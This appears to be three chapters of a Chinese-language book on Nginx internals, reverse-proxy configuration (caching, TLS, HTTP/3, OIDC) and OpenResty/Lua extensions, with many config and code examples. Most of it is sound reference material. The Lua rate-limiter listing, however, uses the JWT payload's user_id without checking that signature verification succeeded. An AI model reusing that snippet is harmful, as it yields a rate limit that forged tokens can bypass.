Nginx 核心架構
2002 年俄羅斯 Rambler 入口網站催生的世界第一

Igor Sysoev 在 2002 年為 Rambler 寫的高效能 web server，2026 年仍是全球網站市佔第一。本章拆解 Nginx 的 process model、event-driven 架構、配置層級、location 匹配規則與變數系統 — 你之後讀任何 nginx.conf 都不會再迷路。

2002 年俄羅斯入口網站 Rambler 的工程師 Igor Sysoev 開始寫 Nginx，目標是解決 Rambler 在 Apache 上遇到的 C10K 瓶頸。2004 年首次公開，2011 年 Nginx Inc. 成立商業化，2019 年被 F5 Networks 收購。Nginx 的設計哲學是「為網際網路規模設計的 web server」 — event-driven、單一執行緒處理萬級連線、零 thread context switching。2026 年它仍是全球網站市佔第一的 web server，也是最廣為使用的 reverse proxy。本章建立 Nginx 的核心架構認識 — 這是 Part IV 後續所有實戰的基礎。

27.2 — Process model：master + workers

Nginx 在啟動時 fork 出多個 process，形成階層結構：

圖 27.1　Nginx 的 master + worker process 模型。Master 用 root 處理特權操作，worker 用低權限使用者運行。

關鍵性質：

  • Master 不處理連線，只做控制面（讀配置、fork worker、處理 signal）
  • Worker 是平等的，每個都能 accept 任何 listening socket（透過 SO_REUSEPORT 或 accept_mutex 避免驚群）
  • Worker 數量建議設為 CPU core 數（worker_processes auto;）— 超過 core 數沒用，不到反而沒善用 CPU
  • Worker 之間不共享記憶體，但能透過 shared memory zone（proxy_cache_path、limit_req_zone 等）共享狀態
  • Reload 是 graceful：master 收到 SIGHUP 後 fork 新 worker，舊 worker 處理完現有連線後優雅退出

2024 年起 Nginx 加入 privileged agent process（Plus 獨有）— 一個與 master 共存的特權 process，用於需要 root 但不能在 worker 做的事（如執行外部腳本）。

27.3 — Event-driven：epoll、kqueue、io_uring

Nginx 的核心是 event loop。每個 worker 是單一執行緒，透過 OS 提供的 event notification 機制同時處理數萬連線。

主流 OS 的 event 機制：

OS機制特性
Linuxepoll2.6+ 內建，O(1) 通知，事實標準
FreeBSD / macOSkqueueBSD 系列，類 epoll
Solaris/dev/poll歷史遺留
WindowsIOCP非 POSIX 模型

Nginx 的 event loop 大致是：

Worker 主迴圈（簡化）for (;;) {
    timer = ngx_event_find_timer();    # 找最近一個 timer
    epoll_wait(epfd, events, n, timer); # 阻塞等 event

    for (i = 0; i < nready; i++) {
        ev = events[i].data.ptr;
        ev->handler(ev);                # 處理 event
    }

    ngx_event_expire_timers();         # 處理已到期 timer
    ngx_process_signals();              # 處理 master 來的 signal
}

2025 年起 Nginx mainline 開始實驗 io_uring 支援（cf. Ch.6 §6.5）。2026 年仍非預設，但對 Linux 5.10+ 的高負載場景效益明顯（特別是檔案 IO 密集場景）。Cloudflare 早在 2022 年就在自家 Nginx fork 中導入 io_uring，公開的 benchmarks 顯示 30% 以上吞吐量提升。

27.4 — 配置層級結構

Nginx 配置是嵌套的 context（區塊）。最重要的層級：

nginx.conf 完整層級結構# ═══ main context ═══
user nobody;
worker_processes auto;
error_log /var/log/nginx/error.log warn;

events {
    # ═══ events context ═══
    worker_connections 10240;
    use epoll;
    multi_accept on;
}

http {
    # ═══ http context ═══
    include mime.types;
    default_type application/octet-stream;
    sendfile on;
    keepalive_timeout 65;

    upstream backend {
        # ═══ upstream context ═══
        server 10.0.0.1:8080;
        server 10.0.0.2:8080;
    }

    server {
        # ═══ server context ═══
        listen 443 ssl http2;
        server_name api.example.com;

        ssl_certificate /etc/ssl/cert.pem;
        ssl_certificate_key /etc/ssl/key.pem;

        location /api/ {
            # ═══ location context ═══
            proxy_pass http://backend;
            proxy_set_header Host $host;
        }

        location = /health {
            # ═══ 另一個 location ═══
            access_log off;
            return 200 "ok\n";
        }
    }
}

stream {
    # ═══ L4 (TCP/UDP) reverse proxy context ═══
    # 與 http 平行，處理非 HTTP 流量
    server {
        listen 5432;
        proxy_pass postgres-cluster;
    }
}

三大 top-level context：events（事件處理參數）、http（HTTP 反向代理）、stream（L4 TCP/UDP 反向代理）。stream context 從 1.9.0 起加入，把 Nginx 從純 HTTP server 升級為通用 L4/L7 proxy。

更深入的 context（mail、events 等）較少用到。絕大多數 nginx.conf 只用到 main / events / http / server / location / upstream 六個層級。

27.5 — Location 匹配規則：最被誤解的部分

Location 規則是 Nginx 配置最容易踩雷的地方。規則順序與匹配優先級不一致是新手最大的混淆來源。

五種 location 修飾詞

修飾詞匹配方式優先級
=精確匹配 URI最高（1）
^~前綴匹配，匹配後不再嘗試 regex2
~大小寫敏感的 regex 匹配3（與 ~* 同級，按出現順序）
~*大小寫不敏感的 regex 匹配3
(無修飾詞)前綴匹配4（最低，所有 regex 不匹配時 fallback）

匹配演算法

Nginx 處理請求時的 location 選擇流程：

  1. 找精確匹配（=）— 找到就立即使用，停止
  2. 找前綴匹配（無修飾詞與 ^~），記住最長的那一個
  3. 如果最長前綴是 ^~ 修飾的 — 用它，停止
  4. 否則嘗試 regex（~ 與 ~*），按配置中出現順序，找到第一個匹配就用
  5. 所有 regex 都不匹配 → 用步驟 2 找到的最長前綴

這個演算法的非直覺後果：regex 的順序影響結果，但前綴匹配不影響。

經典踩雷範例server {
    listen 80;

    location / {
        return 200 "root\n";
    }

    location ~ \.php$ {
        return 200 "php regex\n";
    }

    location ^~ /static/ {
        return 200 "static prefix\n";
    }

    location = /api {
        return 200 "exact api\n";
    }
}

# 測試結果：
# GET /api          → "exact api"   (精確匹配勝出)
# GET /api/users    → "root"        (退回前綴 / )
# GET /static/x.php → "static prefix" (^~ 不再嘗試 regex)
# GET /index.php    → "php regex"   (regex 命中)
# GET /             → "root"

^~ 修飾詞的存在就是為了「前綴匹配命中後，禁止再嘗試 regex」。/static/ 下的 .php 不該被當成 PHP 處理（避免靜態目錄被當成可執行）— 所以用 ^~ 鎖死。

2026 年的最佳實踐

  • 能用 = 就用 =（如 health check、特定 API endpoint）
  • 靜態檔案目錄用 ^~ 避免 regex 干擾
  • regex 越少越好（每個 regex 對每個請求都要試）
  • 用 nginx -T 驗證配置，看實際生效的 location

27.6 — 變數系統：$-prefix 的世界

Nginx 變數以 $ 開頭，類似 shell。它們不是配置檔變數（無法用 set 之外的方式賦值），而是運行時動態值。

內建變數分類

Nginx 內建約 200+ 變數，依模組劃分：

類別範例用途
請求基本$request_method, $request_uri, $argsHTTP method、URI、query string
Client 資訊$remote_addr, $remote_user, $http_user_agent來源 IP、用戶名、UA
Server 資訊$server_name, $server_port, $host監聽資訊、Host header
Header$http_xxx (Request), $sent_http_xxx (Response), $cookie_xxx動態存取任意 header
Upstream$upstream_addr, $upstream_response_time, $upstream_status後端資訊（reverse proxy 必用）
SSL$ssl_server_name, $ssl_cipher, $ssl_protocolTLS 細節
時間$time_local, $time_iso8601, $msec請求時間
內部$pid, $nginx_versionprocess 與版本

變數的關鍵特性：

  • 大多數是唯讀，只有少數能用 set 修改（自定義變數）
  • 變數是 lazy 求值，第一次使用才計算，計算後 cache 到本次請求結束
  • 有些變數有 phase 限制（例如 $request_body 只在 access phase 之後可用）
  • 用 $http_xxx 動態取得任意 request header（如 $http_authorization 取 Authorization header）

實戰範例 — 用變數做動態路由：

map $http_user_agent $backend_pool {
    default          general-pool;
    "~*Mobile"       mobile-pool;
    "~*Bot"          bot-pool;
}

server {
    listen 80;
    location / {
        proxy_pass http://$backend_pool;
    }
}

map 是強大的工具 — 把一個變數透過匹配規則映射到另一個變數，編譯時建立 hash table，O(1) 查詢。

27.7 — Directive 繼承機制

Nginx directive（指令）有繼承機制 — 在外層設定的 directive 會被內層繼承，但內層可以 override。

http {
    proxy_connect_timeout 5s;            # 全 http 預設
    proxy_read_timeout 60s;
    proxy_send_timeout 60s;

    server {
        proxy_read_timeout 120s;        # 此 server override

        location /slow-api/ {
            proxy_read_timeout 600s;    # 此 location 又 override
            proxy_pass http://backend;
        }

        location /fast-api/ {
            proxy_pass http://backend;     # 用 server 的 120s
        }
    }
}

但繼承有陷阱：

陷阱 1：array directives 不繼承

大部分 directive 是「scalar」（單一值），會繼承。但「array」directive（如 proxy_set_header、add_header）只在同一層累加。一旦內層出現該 directive，外層的所有同名 directive全部失效。

server {
    add_header X-Frame-Options DENY;        # server 層
    add_header X-Content-Type-Options nosniff;

    location /api/ {
        add_header X-API-Version "v1";     # 只剩這一個！
        # X-Frame-Options 與 X-Content-Type-Options 不會送！
        proxy_pass http://backend;
    }
}

修正方法：在內層重複所有 add_header（不雅但唯一可靠方法），或用 more_headers（OpenResty 模組）。

陷阱 2：proxy_set_header 也是 array

同樣陷阱適用於 proxy_set_header。每個 location 要設定的 header 都得列全。

陷阱 3：location 內的 if 是邪惡的

Nginx 官方文件直白寫了：「If is Evil」。location 內的 if 行為極度不直覺，特別是與 proxy_pass、rewrite 混用。能用 map 或 try_files 的場景就別用 if。

27.8 — 性能基線：別人的數字不是你的數字

Nginx 在 4-core VPS 上能跑 40,000+ RPS（HTTP/1.1 短連線、無 TLS）。但這個數字在你的環境很可能達不到 — 性能受制於：

  • 是否啟用 TLS：TLS 1.3 + ECDSA 比 RSA 省約 50% CPU；ChaCha20 比 AES 在無 hardware AES 時快
  • Keepalive 比例：每次 short-lived connection 要 3-way handshake，TPS 顯著下降
  • 是否 reverse proxy：反向代理多一倍 syscall（client 端 + upstream 端）
  • worker_connections 與 fd ulimit：兩者都要夠
  • kernel tuning：net.core.somaxconn、net.ipv4.tcp_tw_reuse 等
  • 網卡硬體 offload：TSO、GSO、checksum offload 都顯著影響

只有自己環境的 benchmark 才算數。常用測試工具：wrk、wrk2、vegeta、oha（2024 年起 Rust 寫的新工具，推薦）。最簡單的測試：

$ wrk -t8 -c200 -d30s --latency http://localhost/health

  -t8     8 threads
  -c200   200 concurrent connections
  -d30s   run 30 seconds

注意 wrk 預設 keepalive，這在 reverse proxy 場景很實際；要測短連線加 --connection-close。

27.9 — 工程師的最低 nginx.conf

本章以一個「什麼都做對的最小範本」結束。可以當作所有新 server 的起點：

Listing 27.1 · 生產環境最低 nginx.conf 範本user nginx;
worker_processes auto;
worker_rlimit_nofile 65535;
error_log /var/log/nginx/error.log warn;
pid /run/nginx.pid;

events {
    worker_connections 10240;
    use epoll;
    multi_accept on;
}

http {
    # 基本
    include mime.types;
    default_type application/octet-stream;
    charset utf-8;
    server_tokens off;        # 不洩漏 nginx 版本

    # 連線
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    keepalive_requests 100;
    reset_timedout_connection on;

    # 緩衝
    client_header_buffer_size 1k;
    large_client_header_buffers 4 8k;
    client_max_body_size 10m;
    client_body_buffer_size 128k;

    # 壓縮
    gzip on;
    gzip_vary on;
    gzip_min_length 1024;
    gzip_types text/plain text/css text/xml application/json application/javascript;

    # Log 格式（含 upstream 資訊）
    log_format main '$remote_addr - $remote_user [$time_iso8601] '
                    '"$request" $status $body_bytes_sent '
                    '"$http_referer" "$http_user_agent" '
                    'rt=$request_time uct="$upstream_connect_time" '
                    'urt="$upstream_response_time"';
    access_log /var/log/nginx/access.log main;

    # SSL 全域基準（個別 server 可 override）
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 1d;
    ssl_session_tickets off;

    include /etc/nginx/conf.d/*.conf;   # 把 server block 拆出去
}

這份配置展現的是「合理預設」的工程哲學 — 不放最佳化的浮誇參數，而是放所有人都該開的基本選項。實際 server block 寫在 /etc/nginx/conf.d/*.conf，每個服務一個檔案。

28.2 — proxy_pass：核心反向代理 directive

proxy_pass 是 reverse proxy 一切的起點。但它的細節常被誤解。

URI 是否帶尾路徑：行為截然不同

陷阱：proxy_pass 的兩種行為# 範例 A：proxy_pass 不帶 URI（只有 host:port）
location /api/ {
    proxy_pass http://backend;     # 沒有 trailing /
}
# 請求 /api/users → backend 收到 /api/users（完整路徑）

# 範例 B：proxy_pass 帶 URI（含 / 或 path）
location /api/ {
    proxy_pass http://backend/;    # 有 trailing /
}
# 請求 /api/users → backend 收到 /users（剝掉了 /api/）

# 範例 C：proxy_pass 帶完整 path
location /api/ {
    proxy_pass http://backend/v1/;
}
# 請求 /api/users → backend 收到 /v1/users

規則：proxy_pass 的 URI 部分（/之後的）會替換 location 的匹配部分。沒有 URI（範例 A）就不替換。這個差別在 production 不知道有多少次造成 bug。記住：proxy_pass 的 trailing slash 不是裝飾，是語意。

proxy_set_header 三個必設

沒有設定這三個 header，後端 app 會看到混亂的資訊：

location / {
    proxy_pass http://backend;
    proxy_set_header Host              $host;
    proxy_set_header X-Real-IP         $remote_addr;
    proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}
  • Host：預設 Nginx 會用 upstream 名稱（如 backend）覆蓋；多數後端 app 需要原始 Host
  • X-Real-IP：原始 client IP（cf. Ch.10 §10.5）
  • X-Forwarded-For：$proxy_add_x_forwarded_for 自動 append client IP 到既有 XFF（多層 proxy 鏈友好）
  • X-Forwarded-Proto：原始協定（讓後端知道是 HTTPS 還是 HTTP）— 後端做 redirect 或產生 absolute URL 時關鍵

28.3 — Upstream 與負載平衡演算法

Upstream block 定義一群後端 server。Nginx 內建多種負載平衡演算法：

完整範例

upstream backend {
    # 演算法
    least_conn;

    # Server 列表
    server 10.0.0.1:8080 weight=3;
    server 10.0.0.2:8080 weight=2;
    server 10.0.0.3:8080 backup;     # 主要全掛才用
    server 10.0.0.4:8080 down;       # 暫時停用

    # Failure detection（passive health check）
    server 10.0.0.5:8080 max_fails=3 fail_timeout=30s;

    # Connection pool（重要！）
    keepalive 32;            # 維持 32 條 idle 連線到 backend
    keepalive_requests 100;   # 每條連線最多服務 100 請求後關
    keepalive_timeout 60s;
}

server {
    location / {
        proxy_pass http://backend;
        proxy_http_version 1.1;            # keepalive 必須 HTTP/1.1
        proxy_set_header Connection "";     # 移除 Connection header
    }
}

為什麼 keepalive 至關重要

沒設 keepalive 時，每個請求都要新建到 backend 的 TCP 連線。當 backend 是另一個資料中心時，這意味著每個請求 +50ms 延遲與 +CPU。設 keepalive 32 後，Nginx 維持 32 條 idle 連線重複使用，P99 latency 通常下降 30-50%。這是 reverse proxy 最常見也最容易忽略的優化。

28.5 — Cache：proxy_cache 完整機制

Nginx 內建的 proxy_cache 是免費的 reverse proxy cache。功能完整 — RFC 7234 compliant、shared memory 索引、磁碟儲存、purge / bypass 機制。

Listing 28.1 · 完整 cache 配置# 1. 在 http context 定義 cache zone
proxy_cache_path /var/cache/nginx
    levels=1:2                       # 兩層目錄結構（分散 inode）
    keys_zone=my_cache:100m         # shared memory zone（key 索引）
    max_size=10g                    # 最大磁碟使用
    inactive=60m                    # 60 分鐘沒人訪問就刪
    use_temp_path=off;              # 直接寫入 cache 目錄（避免跨設備複製）

server {
    location / {
        # 啟用 cache
        proxy_cache my_cache;
        proxy_cache_key "$scheme$request_method$host$request_uri";

        # 哪些 status code 要 cache 多久
        proxy_cache_valid 200 301 302  10m;
        proxy_cache_valid 404          1m;
        proxy_cache_valid any          5s;

        # 同時多個請求 → 只發一個給 backend，其他等
        proxy_cache_lock on;
        proxy_cache_lock_timeout 5s;

        # Backend 暫時掛了 → 用 stale cache 繼續服務
        proxy_cache_use_stale error timeout updating http_500 http_502 http_503;
        proxy_cache_background_update on;     # 背景更新

        # Bypass 條件（某些 cookie 存在就不 cache）
        proxy_cache_bypass $cookie_session $arg_nocache;
        proxy_no_cache    $cookie_session $arg_nocache;

        # 在 response 加 X-Cache-Status header（除錯用）
        add_header X-Cache-Status $upstream_cache_status;

        proxy_pass http://backend;
    }
}

$upstream_cache_status 的值

  • HIT：命中 cache
  • MISS：cache 沒有，要去 backend
  • BYPASS：因為 bypass 條件不查 cache
  • EXPIRED：cache 過期了，重新拿
  • STALE：用過期 cache（backend 掛了）
  • UPDATING：背景更新中，先回舊內容
  • REVALIDATED：用 If-Modified-Since 重新驗證 cache 仍有效

Cache key 設計的學問

Cache key 預設是 $scheme$proxy_host$request_uri，但你應該根據業務語意設計：

  • 不同地區看到不同內容 → key 加 $geoip_country_code
  • 登入狀態影響內容 → key 加 $cookie_userid 或乾脆 bypass
  • RESTful API 對 query string 敏感 → key 加 $args 或排序後的 args
  • 多語系網站 → key 加 $http_accept_language

28.6 — SSL 配置最佳實踐（2026 年版）

2026 年的 SSL 配置最佳實踐：

Listing 28.2 · 2026 年生產級 SSL 配置server {
    listen 443 ssl;
    listen [::]:443 ssl;
    listen 443 quic reuseport;       # HTTP/3
    http2 on;
    http3 on;                     # 1.25.0+

    server_name www.example.com;

    # === 憑證 ===
    ssl_certificate     /etc/letsencrypt/live/www.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/www.example.com/privkey.pem;

    # === 協定版本 ===
    ssl_protocols TLSv1.2 TLSv1.3;       # 1.0 / 1.1 在 2020 年棄用

    # === Cipher suite ===
    # Mozilla 推薦的 "intermediate" 等級 (2026)
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;
    ssl_prefer_server_ciphers off;       # TLS 1.3 已不需要

    # === Session resumption ===
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 1d;
    ssl_session_tickets off;             # 安全考量（forward secrecy）

    # === OCSP Stapling ===
    ssl_stapling on;
    ssl_stapling_verify on;
    ssl_trusted_certificate /etc/letsencrypt/live/www.example.com/chain.pem;
    resolver 1.1.1.1 8.8.8.8 valid=300s ipv6=off;

    # === ECH (Encrypted Client Hello, 1.29.4+) ===
    ssl_ech_keys /etc/nginx/ech_keys.pem;

    # === Early data (0-RTT, 注意安全！) ===
    ssl_early_data on;

    # === HSTS ===
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

    location / {
        proxy_pass http://backend;
        # 把 0-RTT 標記傳給 backend，由 backend 決定是否信任
        proxy_set_header Early-Data $ssl_early_data;
    }
}

關鍵 directive 解釋

  • ssl_session_tickets off：session ticket 是性能優化，但 ticket 加密金鑰若洩漏會破壞前向安全（forward secrecy）。生產環境推薦關閉，改用 session cache
  • ssl_stapling on：OCSP stapling 讓 Nginx 主動拿憑證撤銷狀態 cache 後傳給 client，省去 client 自己問 CA 的延遲與隱私問題
  • ssl_ech_keys（1.29.4+）：啟用 Encrypted Client Hello（cf. Ch.11 §11.6）。需要與支援的 CDN（Cloudflare）或 Browser 配合
  • ssl_early_data on：啟用 TLS 1.3 的 0-RTT。必須把 $ssl_early_data 傳給 backend，由 backend 拒絕在 0-RTT 中執行非冪等請求（POST、PUT、DELETE）

28.7 — HTTP/3 與 Multipath TCP

HTTP/3 啟用

Nginx 1.25.0（2023/05）開始原生支援 HTTP/3。啟用只需兩行：

server {
    listen 443 ssl;
    listen 443 quic reuseport;       # UDP/443 監聽 QUIC
    http2 on;
    http3 on;

    # 必要：透過 Alt-Svc header 告訴 client「我有 HTTP/3」
    add_header Alt-Svc 'h3=":443"; ma=86400';
}

注意：UDP/443 必須在防火牆放行，否則 client 嘗試 HTTP/3 會 timeout 後 fallback HTTP/2。多數企業防火牆預設只開 TCP/443。

Multipath TCP（1.29.7+）

2026/01 釋出的 1.29.7 加入 MPTCP（Multipath TCP，RFC 8684）支援。MPTCP 讓單一 TCP 連線同時走多個網路路徑（如 WiFi + 4G），自動容錯與聚合頻寬。

server {
    listen 443 ssl multipath;     # 1.29.7+
    # ...
}

MPTCP 對 mobile 應用（網路頻繁切換）有顯著效益。Apple 在 iOS 7+ 用 MPTCP 跑 Siri；2026 年起 Nginx 支援後，預期會在 mobile-first 服務逐步採用。前提是 Linux kernel 5.6+ 與 client OS 支援。

CUBIC 擁塞控制（Plus R36）

NGINX Plus R36 為 HTTP/3/QUIC 加入 CUBIC 擁塞控制（取代過去的 Reno）。CUBIC 是 Linux TCP 的預設 CC algorithm（自 2.6.19, 2006），在高頻寬延遲產品（BDP）的場景顯著優於 Reno。對長距離連線（如跨大洲）特別重要。

28.8 — Native OIDC（NGINX Plus R36，2026）

過去 Nginx 要做 OIDC 認證需要 Lua（OpenResty）或 sidecar（oauth2-proxy）。NGINX Plus R36 引入原生 OIDC 模組，是 2026 年最重要的新功能。

Listing 28.3 · NGINX Plus R36 OIDC（簡化）http {
    # OIDC provider 配置
    auth_oidc_provider okta {
        issuer https://example.okta.com/oauth2/default;
        client_id "my-client-id";
        client_secret "my-client-secret";
        redirect_uri /oidc-callback;
    }

    server {
        listen 443 ssl;

        location /oidc-callback {
            # OIDC callback endpoint
            auth_oidc okta;
        }

        location /private {
            # 受保護資源
            auth_oidc okta;
            # R36 新功能：用 auth_require 做進階授權
            auth_require $oidc_claim_groups ~ "admin";
            proxy_pass http://backend;
        }

        location /logout {
            # R36 新功能：RP-initiated Logout
            auth_oidc_logout okta;
        }
    }
}

R36 的三大 OIDC 升級

  • RP-initiated Logout：Nginx 主動觸發登出，並通知 IdP 清除 session。過去要自己在 backend 寫
  • UserInfo endpoint 整合：Nginx 自動呼叫 OIDC UserInfo 取得 claims，存入 $oidc_claim_xxx 變數
  • auth_require 模組：基於任何變數（含 OIDC claims、njs 計算結果）做存取決策

這套機制讓 Nginx 變成真正的 identity-aware proxy，能取代 oauth2-proxy 等 sidecar。對於不想自架 Pomerium / Authelia 的團隊是個輕量整合方案。

Chapter 29

OpenResty 與 Lua 擴展
章亦春的 Nginx + LuaJIT 整合，把 reverse proxy 變成可程式化平台

2011 年章亦春（agentzh）發布 OpenResty，把 LuaJIT 嵌入 Nginx，讓 reverse proxy 能在每個請求 phase 跑 Lua 程式碼。Cloudflare Workers 早期、Kong API Gateway、Apache APISIX 都源自這個架構。本章解構 phase 模型與真實工程應用。

Nginx 的 C module 開發門檻高 — 要懂 Nginx event model、要正確處理記憶體、要重新編譯。對「我只是想在 reverse proxy 加一段業務邏輯」的工程師，這成本太高。OpenResty 的解法是把 LuaJIT 嵌入 Nginx：你寫 Lua，OpenResty 在合適的 phase 執行你的程式碼，性能接近 C（LuaJIT 的編譯魔法），開發體驗接近 Python。本章解構這個 2011 年起改變 reverse proxy 生態的工具。

29.1 — OpenResty 是什麼？

OpenResty 不是 fork — 它是 Nginx + 一系列高品質 Lua 模組的整合發行版。核心元件：

  • ngx_http_lua_module：在 Nginx 內嵌 LuaJIT runtime
  • ngx_stream_lua_module：在 stream context（L4 proxy）內嵌 Lua
  • lua-resty-* 函式庫：MySQL、Redis、Memcached、HTTP client、DNS、JWT 等的 Lua 實作
  • OpenResty CLI（resty）：命令列執行 Lua 腳本（不需 Nginx server）

OpenResty 由章亦春在 2007 年開始開發，2011 年正式以「OpenResty」之名發布。章亦春先後在 Yahoo、淘寶、CloudFlare 工作期間持續維護。2026 年最新版是 1.27.1.2（基於 Nginx 1.27.1）；OpenResty 通常落後 Nginx 主線一兩個 minor 版本，因為要為 Lua 模組做 patch。

29.2 — LuaJIT：為什麼能達到 C 的性能

OpenResty 不用標準 Lua（PUC-Rio Lua），而是 LuaJIT（Mike Pall 開發，2005+）。LuaJIT 是 JIT-compiled Lua，性能在多個 benchmark 接近 C，遠超 Python / Ruby / 標準 Lua。

關鍵性質：

  • Trace JIT compiler：偵測 hot path 後 JIT 編譯成 native code
  • FFI（Foreign Function Interface）：Lua 直接呼叫 C 函式，零 wrapper overhead
  • Coroutine：cooperative 多工，OpenResty 用它做非阻塞 IO
  • 記憶體佔用小：每個 coroutine 約幾 KB

注意：LuaJIT 仍維持 Lua 5.1 語法（不是 5.2/5.3/5.4）。Lua 5.1 是 LuaJIT 的「相容性錨點」— Mike Pall 為了 JIT 性能不引入 5.1 之後的新語法。對 OpenResty 程式設計師而言這不是問題，反而確保 LuaJIT 永遠能跑7。

關鍵設計原則：Lua 程式碼不要做阻塞 IO。要做 IO 必須用 cosocket（OpenResty 提供的非阻塞 socket）或 lua-resty-* 函式庫。否則 Nginx 整個 worker 會阻塞，性能歸零。

29.4 — 實戰：自寫 rate limiter

限流是 OpenResty 最常見的應用之一。Nginx 內建的 limit_req_zone 只能基於固定 key（IP、URI 等）；OpenResty 能寫複雜邏輯。

Listing 29.1 · 自寫 rate limiter（token bucket）# nginx.confhttp {
    lua_shared_dict ratelimit 10m;     # 10MB shared memory

    server {
        location /api/ {
            access_by_lua_block {
                local limit_req = require "resty.limit.req"
                -- rate=100/s, burst=200
                local lim, err = limit_req.new("ratelimit", 100, 200)
                if not lim then
                    ngx.log(ngx.ERR, "failed: ", err)
                    return ngx.exit(500)
                end

                -- 用 user_id (從 JWT 取) 做 key，比 IP 精準
                local jwt = require "resty.jwt"
                local token = ngx.req.get_headers()["Authorization"]
                local obj = jwt:verify("my-secret", token)
                local key = obj.payload.user_id or ngx.var.remote_addr

                local delay, err = lim:incoming(key, true)
                if not delay then
                    if err == "rejected" then
                        ngx.header["Retry-After"] = "1"
                        return ngx.exit(429)
                    end
                    ngx.log(ngx.ERR, "failed: ", err)
                    return ngx.exit(500)
                end

                if delay > 0.001 then
                    ngx.sleep(delay)        -- 非阻塞 sleep
                end
            }

            proxy_pass http://backend;
        }
    }
}

這 30 行 Lua 程式碼實現了：

  • 從 JWT 取 user_id 作為 rate limit key（無 JWT 退回 IP）
  • Token bucket 演算法：100 RPS 平均、200 burst
  • 超過時送 429 + Retry-After
  • 輕微超過時用 ngx.sleep 平滑（不直接拒絕）

這在純 Nginx 用 limit_req 做不到。OpenResty 的核心價值就在這裡 — 把 5% 需要客製化的邏輯做出來，又不犧牲 95% 的性能。

29.5 — 實戰：動態 upstream 選擇

另一個 OpenResty 經典應用：基於請求特徵動態選擇 backend。

Listing 29.2 · 用 balancer_by_lua 做藍綠部署upstream backend {
    # 必須有至少一個 placeholder server
    server 0.0.0.0:1;

    balancer_by_lua_block {
        local balancer = require "ngx.balancer"
        local redis = require "resty.redis"

        -- 從 Redis 動態取 backend pool（藍綠切換）
        local red = redis:new()
        red:set_timeout(100)
        red:connect("redis.internal", 6379)
        local active_pool = red:get("deploy:active_pool")  -- "blue" 或 "green"
        red:set_keepalive(10000, 100)

        local backends = {
            blue  = { "10.0.1.1", "10.0.1.2", "10.0.1.3" },
            green = { "10.0.2.1", "10.0.2.2", "10.0.2.3" },
        }

        local pool = backends[active_pool] or backends.blue
        local ip = pool[math.random(#pool)]

        local ok, err = balancer.set_current_peer(ip, 8080)
        if not ok then
            ngx.log(ngx.ERR, "failed to set: ", err)
            return ngx.exit(500)
        end

        balancer.set_more_tries(2)              -- 失敗時重試 2 次
    }
}

這個範例展示了 OpenResty 真正的力量 — 把外部系統（Redis）整合進 Nginx 的請求路徑。每個請求都動態查 Redis 決定 backend，無需 reload Nginx。Kubernetes Ingress Controller、雲廠商的 LB、API Gateway 內部都用類似機制。

29.6 — Kong API Gateway：OpenResty 的旗艦應用

Kong（前身 Mashape，2015 開源）是世界上採用最廣的 OpenResty-based 產品。架構：

  • 核心是 OpenResty
  • 用 PostgreSQL 或 Cassandra 儲存路由規則、認證憑證、plugin 配置
  • 所有功能（auth、rate limit、transformation）都是 Lua 寫的 plugin
  • 豐富的 plugin 生態（Key Auth、JWT、OAuth2、Prometheus、Datadog、AWS Lambda 等）

2024 年起 Kong 推出 Kong AI Gateway（基於 Kong 3.6+），加入 AI 流量稽核、LLM proxy、prompt management 等功能。Part V 會展開這個議題。

29.7 — Cloudflare Workers 的歷史淵源

2017 年 Cloudflare 推出 Workers（serverless edge computing）— 但第一代 Cloudflare Workers 不是用 V8，而是用 OpenResty。Cloudflare 工程師 Kenton Varda（其中一位 Cap'n Proto 設計者）在 2017 年的 blog post 揭露：早期 Workers 是 OpenResty 上跑 Lua，但因為 Cloudflare 客戶熟悉 JavaScript 而非 Lua，後來改用 V8 isolates。

但 Cloudflare 的邊界 proxy（處理流量、做 cache、SSL termination）至今仍是 OpenResty 為核心。每個 Cloudflare PoP 跑 OpenResty + 大量自寫 Lua 模組處理上百萬 RPS 流量。章亦春 2014-2017 年在 Cloudflare 工作期間貢獻巨大8。

這個故事的啟示：OpenResty 在最大規模 production 流量場景已被驗證。即使 2026 年有更新的 reverse proxy 框架（Envoy、Pingora），OpenResty 仍是邊界流量處理的基石。

29.8 — Pingora：Cloudflare 的下一代（2024 開源）

2024 年 Cloudflare 開源了內部的下一代 proxy framework —Pingora（Rust 寫的 reverse proxy framework）。動機：

  • OpenResty / Nginx 雖快，但 Lua 在極致性能場景仍有 GC 暫停與 JIT 啟動成本
  • Cloudflare 規模下，每微秒省下都是可觀的成本
  • 記憶體安全（避免歷史上 Nginx 的多個 RCE）
  • 更容易並行（Rust 的 ownership model）

Pingora 不是「取代 OpenResty 的工具」 — 它是「讓你寫自己的 proxy 應用」的 framework。Cloudflare 用它取代了大部分 OpenResty / Nginx 部署，但不建議所有人都這樣做：

  • Pingora 仍年輕（2024 才開源），社群小
  • 需要 Rust 工程能力
  • 缺少 Nginx / OpenResty 那麼成熟的配置語言（你要寫 Rust code）

Pingora 真正的意義是：Cloudflare 證明了「自寫 proxy framework」是可行且必要的，啟發了 Discord、Medium 等公司類似的內部建設。但對大多數企業，OpenResty 仍是最佳「Nginx + 客製邏輯」的方案。

29.9 — 何時該用 OpenResty？

OpenResty 不是 Nginx 的全面升級 — 它是針對特定場景的解決方案。

該用 OpenResty 的場景

  • 需要寫客製化 reverse proxy 邏輯（rate limit、auth、routing）
  • 建構 API Gateway（Kong、APISIX 都基於它）
  • 需要在邊緣做動態決策（地理路由、A/B test、藍綠部署）
  • 整合外部系統（Redis、Kafka、Postgres）到請求路徑
  • 替代多個 sidecar / middleware（一個 OpenResty + Lua 替代 5 個服務）

不該用 OpenResty 的場景

  • 純靜態內容服務（普通 Nginx 即可）
  • 純 reverse proxy 加標準 directive 即可解決（不要為了 cool 引入 Lua）
